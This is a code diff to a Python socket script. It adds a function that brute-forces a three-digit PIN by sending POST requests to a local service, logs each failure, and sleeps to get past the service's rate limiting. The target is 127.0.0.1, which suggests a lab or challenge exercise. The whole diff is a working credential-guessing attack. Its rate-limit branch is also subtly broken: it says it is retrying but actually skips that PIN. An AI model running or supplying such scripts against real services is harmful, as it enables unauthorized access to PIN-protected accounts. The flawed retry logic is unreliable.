@@ -1,4 +1,5 @@
 import socket
+import time
 
 def send_post_request(pin):
     host = "127.0.0.1"
@@ -31,5 +32,23 @@ def send_post_request(pin):
     except Exception as e:
         return f"An error occurred: {e}"
 
+def brute_force_pin():
+    for pin in range(1000):
+        print(f"Trying PIN: {pin:03d}")
+        response = send_post_request(pin)
+
+        if "Incorrect number" in response:
+            print(f"❌ PIN {pin:03d} is incorrect.")
+        elif "Please wait" in response:
+            print(f"Rate limit hit — retrying...")
+            time.sleep(1)
+            continue
+        else:
+            print(f"\n✅ SUCCESS! PIN is {pin:03d}")
+            print(response)
+            break
+
+        time.sleep(1)
+
 if __name__ == "__main__":
-    print(send_post_request(0))
+    brute_force_pin()
